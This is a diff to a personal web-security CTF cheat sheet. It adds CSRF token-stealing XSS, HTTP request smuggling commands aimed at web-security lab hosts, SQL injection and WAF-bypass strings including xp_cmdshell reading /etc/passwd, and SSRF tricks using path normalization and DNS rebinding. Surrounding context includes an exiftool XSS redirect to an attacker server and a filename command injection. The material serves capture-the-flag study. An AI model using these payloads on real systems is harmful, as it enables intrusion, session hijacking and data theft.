@@ -95,11 +95,12 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
 
 # cross-site request forgery (CSRF)
 
+- Server validates that form request was sent with same CSRF token in user session
+    - Extracting token: hardcoded in input / included by js 
+    ```html
+    <img src="http://generateerror.com/does-not-exist.jpg" onerror="javascript:var all_inputs = document.getElementsByTagName('input'); var token = '';for(var i = 0; i < all_inputs.length; i++){if (all_inputs[i].name == 'csrftoken'){token = all_inputs[i].value;}}var iframe = document.createElement('iframe');iframe.src = 'http://ctf.nullcon.net/challenges/web/web4/set_admin.php?user=pepe&csrftoken=' + token + '&Set=Set';document.body.appendChild(iframe);"/>
+    ```
 - [Multiple vulnerabilities that can result in RCE · Issue \#1122 · Codiad/Codiad · GitHub](https://github.com/Codiad/Codiad/issues/1122)
-
-```html
-<img src="http://generateerror.com/does-not-exist.jpg" onerror="javascript:var all_inputs = document.getElementsByTagName('input'); var token = '';for(var i = 0; i < all_inputs.length; i++){if (all_inputs[i].name == 'csrftoken'){token = all_inputs[i].value;}}var iframe = document.createElement('iframe');iframe.src = 'http://ctf.nullcon.net/challenges/web/web4/set_admin.php?user=pepe&csrftoken=' + token + '&Set=Set';document.body.appendChild(iframe);"/>
-```
 
 # server-side template injection (SSTI)
 
@@ -167,9 +168,38 @@ curl -v 'https://let-me-see.pwn.institute/' -G --data-urlencode 'url=http://127.
     - record type = A; IP = 93.184.216.34; Repeat = 1
     - record type = A; IP = 127.0.0.1; Repeat = 1
 
-# request smuggling
+# HTTP Request Smuggling, Desync Bypass
 
-https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c
+Send request to backend bypassing frontend (e.g. proxy)
+
+```bash
+# frontend uses CL, backend uses TE
+# - CL matches 2 requests
+# - send 2 times, on 2nd expect "Unrecognized method GPOST"
+echo -n "POST / HTTP/1.1\r\nHost: ac4d1f4a1e49785a80ae0997008b001c.web-security-academy.net\r\nCookie: session=gexP10lOiJEnEtpU7ew1ROWk8u2RS97A\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG" \
+    | openssl s_client -ign_eof -connect ac4d1f4a1e49785a80ae0997008b001c.web-security-academy.net:443
+
+# frontend uses TE, backend uses CL
+# - TE matches 2 requests
+# - send 2 times, on 2nd expect "Unrecognized method GPOST"
+# - 1st req len = 4: 2nd req len value + newline (2 chars + \r\n)
+# - 2nd req len = `len(o)-7`: remove payload after 2nd request's headers (\r\n0\r\n\r\n)
+echo "POST / HTTP/1.1\r\nHost: ac2b1f971e4e6d0680a69d850033000f.web-security-academy.net\r\nCookie: session=hC2vufpItiaz4fmOv5WWEqCA8yowj0iu\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n""$(python -c 'import re, sys
+o = re.sub(b"\n", b"\r\n", open(sys.argv[1], "rb").read())
+sys.stdout.buffer.write(bytes(str(hex(len(o)-7))[2:], "ascii") + b"\r\n" + o)' ~/code/snippets/ctf/web/request_smuggling_te_cl.txt)" \
+    | openssl s_client -ign_eof -connect ac2b1f971e4e6d0680a69d850033000f.web-security-academy.net:443
+
+# Duplicated headers
+~/code/snippets/ctf/web/request_smuggling_cl_cl.txt
+```
+
+https://book.hacktricks.xyz/pentesting-web/http-request-smuggling
+https://www.imperva.com/blog/http-desync-attacks-and-defence-methods/
+
+### Upgrade protocol
+
+- [GitHub \- BishopFox/h2csmuggler: HTTP Request Smuggling over HTTP/2 Cleartext \(h2c\)](https://github.com/BishopFox/h2csmuggler)
+    - [h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext \(h2c\)](https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c)
 
 # directory traversal
 
@@ -191,6 +221,7 @@ https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-
 - `Range: bytes=x-y`: payload contained in interval
     - [CTFtime\.org / Google Capture The Flag 2018 \(Quals\) / bbs / Writeup](https://ctftime.org/writeup/10369)
 - Same-origin policy: iframes can access each other's data in same domain
+    - Loosened via CORS
     ```javascript
     var d = window.top.frames[0].window.document;
     ```
@@ -326,9 +357,8 @@ exiftool -make "<script>document.location='http://burpcollaboratoridoryourserver
 
 -- %" UNION SELECT "one", "two"; --%";
 -- %" AND username in (SELECT username FROM sqlite_master where username like "%") --
-
--- WAF detection
--- 9495 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+-- Given 3 columns in table:
+-- telnet'	oorr	1=0	UNION	SELECT	*	FROM	(SELECT	1)	AS	a	JOIN	(SELECT	*	from	flag)	AS	b	JOIN	(SELECT	1)	AS	c;#
 ```
 
 ```bash
@@ -407,8 +437,13 @@ filename="'$(sleep 5)'a.gif"
 
 # jail, filter bypass, waf
 
-- testing
+- detection, testing
     - https://regex101.com/
+    ```
+    /?q='oorr''=''%23
+    /?q='oorr/**/1=1/**/%23
+    9495 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+    ```
 - jsfuck
 - https://mathiasbynens.be/notes/javascript-escapes
 - `__defineGetter__`
@@ -445,6 +480,28 @@ filename="'$(sleep 5)'a.gif"
     - https://github.com/BlackFan/content-type-research
     - https://soroush.secproject.com/blog/2018/08/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour/
     - https://blog.doyensec.com/2020/08/20/playframework-csrf-bypass.html
+- HTTP Path Normalization, IDNA
+    ```
+    http://nginx：80/flag.php
+    http://＠nginx/flag.php
+    http://nginx／flag.php
+    http://a:.@✊nginx:80.:/flag.php
+    // ACE = http://a:.xn--@nginx:80-5s4f.:/flag.php
+    ```
+        - Alternative: DNS Rebinding
+        ```
+        GET /?url=http://ocu.chal.seccon.jp:10000/flag.php
+        ---
+        localhost.my_server A   (vulnerable_ip)
+        localhost.my_server A   (my_server_ip)
+        ---
+        GET /?url=http://localhost.my_server/flag.php
+        ```
+        - [CTFtime\.org / SECCON 2019 Online CTF / Option\-Cmd\-U](https://ctftime.org/task/9540)
+    ```
+    Location: https:\\foo.com/bar
+    ```
+        - https://samcurry.net/abusing-http-path-normalization-and-cache-poisoning-to-steal-rocket-league-accounts/
 - DNS tunnel
     - https://github.com/iagox86/dnscat2
 
